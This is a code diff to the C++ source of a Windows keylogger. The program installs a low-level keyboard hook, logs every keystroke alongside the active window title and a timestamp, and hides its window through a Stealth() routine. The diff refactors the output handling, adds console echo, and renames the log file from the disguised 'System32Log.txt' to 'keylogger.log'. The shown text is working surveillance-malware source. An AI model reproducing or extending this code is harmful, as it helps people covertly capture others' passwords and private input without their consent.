@@ -2,6 +2,7 @@
 #include <cstdio>
 #include <fstream>
 #include <iostream>
+#include <sstream>
 #include <time.h>
 
 // defines whether the window is visible or not
@@ -17,7 +18,7 @@ HHOOK _hook;
 KBDLLHOOKSTRUCT kbdStruct;
 
 int Save(int key_stroke);
-std::ofstream OUTPUT_FILE;
+std::ofstream output_file;
 
 // This is the callback function. Consider it the event that is raised when, in this case,
 // a key is pressed.
@@ -61,6 +62,7 @@ void ReleaseHook()
 
 int Save(int key_stroke)
 {
+    std::stringstream output;
     static char lastwindow[256] = "";
 
     if ((key_stroke == 1) || (key_stroke == 2))
@@ -95,75 +97,73 @@ int Save(int key_stroke)
             char s[64];
             strftime(s, sizeof(s), "%c", &tm);
 
-            OUTPUT_FILE << "\n\n[Window: " << window_title << " - at " << s << "] ";
+            output << "\n\n[Window: " << window_title << " - at " << s << "] ";
         }
     }
 
-    std::cout << key_stroke << '\n';
-
     if (key_stroke == VK_BACK)
     {
-        OUTPUT_FILE << "[BACKSPACE]";
+        output << "[BACKSPACE]";
     }
     else if (key_stroke == VK_RETURN)
     {
-        OUTPUT_FILE << "\n";
+        output << "\n";
     }
     else if (key_stroke == VK_SPACE)
     {
-        OUTPUT_FILE << " ";
+        output << " ";
     }
     else if (key_stroke == VK_TAB)
     {
-        OUTPUT_FILE << "[TAB]";
+        output << "[TAB]";
     }
     else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
     {
-        OUTPUT_FILE << "[SHIFT]";
+        output << "[SHIFT]";
     }
     else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
     {
-        OUTPUT_FILE << "[CONTROL]";
+        output << "[CONTROL]";
     }
     else if (key_stroke == VK_ESCAPE)
     {
-        OUTPUT_FILE << "[ESCAPE]";
+        output << "[ESCAPE]";
     }
     else if (key_stroke == VK_END)
     {
-        OUTPUT_FILE << "[END]";
+        output << "[END]";
     }
     else if (key_stroke == VK_HOME)
     {
-        OUTPUT_FILE << "[HOME]";
+        output << "[HOME]";
     }
     else if (key_stroke == VK_LEFT)
     {
-        OUTPUT_FILE << "[LEFT]";
+        output << "[LEFT]";
     }
     else if (key_stroke == VK_UP)
     {
-        OUTPUT_FILE << "[UP]";
+        output << "[UP]";
     }
     else if (key_stroke == VK_RIGHT)
     {
-        OUTPUT_FILE << "[RIGHT]";
+        output << "[RIGHT]";
     }
     else if (key_stroke == VK_DOWN)
     {
-        OUTPUT_FILE << "[DOWN]";
+        output << "[DOWN]";
     }
     else if (key_stroke == 190 || key_stroke == 110)
     {
-        OUTPUT_FILE << ".";
+        output << ".";
     }
     else if (key_stroke == 189 || key_stroke == 109)
     {
-        OUTPUT_FILE << "-";
+        output << "-";
     }
     else if (key_stroke == 20)
     {
-        OUTPUT_FILE << "[CAPSLOCK]";
+        output << "[CAPSLOCK]";
     }
     else
     {
@@ -186,11 +186,14 @@ int Save(int key_stroke)
         {
             key = tolower(key);
         }
-        OUTPUT_FILE << char(key);
+        output << char(key);
     }
 
     // instead of opening and closing file handlers every time, keep file open and flush.
-    OUTPUT_FILE.flush();
+    output_file << output.str();
+    output_file.flush();
+
+    std::cout << output.str();
 
     return 0;
 }
@@ -209,7 +212,10 @@ void Stealth()
 int main()
 {
     // open output file in append mode
-    OUTPUT_FILE.open("System32Log.txt", std::ios_base::app);
+    const char* output_filename = "keylogger.log";
+    std::cout << "Logging output to " << output_filename << std::endl;
+
+    output_file.open("keylogger.log", std::ios_base::app);
 
     // visibility of window
     Stealth();
